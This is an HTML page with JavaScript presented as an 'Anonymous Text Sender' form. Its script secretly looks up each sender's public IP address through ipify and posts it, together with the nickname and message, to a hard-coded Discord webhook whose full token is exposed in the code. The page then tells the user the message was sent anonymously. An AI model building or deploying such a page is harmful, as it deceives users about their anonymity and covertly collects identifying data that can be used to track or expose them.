<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Anonymous Text Sender</title>
  <link href="https://cdn.jsdelivr.net/npm/aos@2.3.1/dist/aos.css" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(135deg, #6C63FF, #9C27B0);
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background: rgba(0, 0, 0, 0.6);
      padding: 30px;
      border-radius: 10px;
      width: 100%;
      max-width: 400px;
      text-align: center;
      animation: fadeIn 1s ease-in-out;
    }
    h1 {
      font-size: 2em;
      margin-bottom: 20px;
      animation: slideIn 1s ease-in-out;
    }
    input, textarea {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: none;
      border-radius: 5px;
      font-size: 1em;
      transition: all 0.3s ease;
    }
    input:focus, textarea:focus {
      border: 2px solid #9C27B0;
    }
    button {
      background-color: #9C27B0;
      color: white;
      padding: 12px 25px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      font-size: 1.1em;
      transition: background-color 0.3s ease;
    }
    button:hover {
      background-color: #7b1fa2;
    }
    @keyframes fadeIn {
      0% { opacity: 0; }
      100% { opacity: 1; }
    }
    @keyframes slideIn {
      0% { transform: translateY(-50px); opacity: 0; }
      100% { transform: translateY(0); opacity: 1; }
    }
  </style>
</head>
<body>
  <div class="container" data-aos="fade-up">
    <h1 data-aos="fade-right">Send Anonymous Text For Me</h1>
    <input type="text" id="nickname" placeholder="Your Nickname (Optional)" data-aos="fade-left">
    <textarea id="message" rows="4" placeholder="Your message..." data-aos="fade-left"></textarea>
    <button onclick="sendMessage()" data-aos="fade-up">Send Message</button>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/aos@2.3.1/dist/aos.js"></script>
  <script>
    AOS.init();

    async function getIpAddress() {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      return data.ip;
    }

    async function sendMessage() {
      const nickname = document.getElementById('nickname').value;
      const message = document.getElementById('message').value;

      if (!message) {
        alert("Please write a message before sending.");
        return;
      }

      const ip = await getIpAddress();

      const payload = {
        embeds: [{
          title: "New Message!",
          color: 0x9C27B0,
          fields: [
            {
              name: "Name:",
              value: nickname || "Anonymous",
              inline: true
            },
            {
              name: "Message:",
              value: message,
              inline: true
            },
            {
              name: "IP Address:",
              value: ip,
              inline: true
            }
          ],
          footer: {
            text: "Anonymous Message System"
          }
        }]
      };

      fetch('https://discord.com/api/webhooks/1243423813207592970/GcDX88noO2nAxiOKC8pIENIv1htrxgbrA-P-4FTEb80IRZEqH1tttivBh2mx2eaRewY5', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      })
      .then(response => {
        if (response.ok) {
          alert("Message sent anonymously!");
          document.getElementById('nickname').value = '';
          document.getElementById('message').value = '';
        } else {
          alert("Failed to send message. Please try again.");
        }
      })
      .catch(error => {
        alert("Error sending message. Please try again.");
      });
    }
  </script>
</body>
</html>
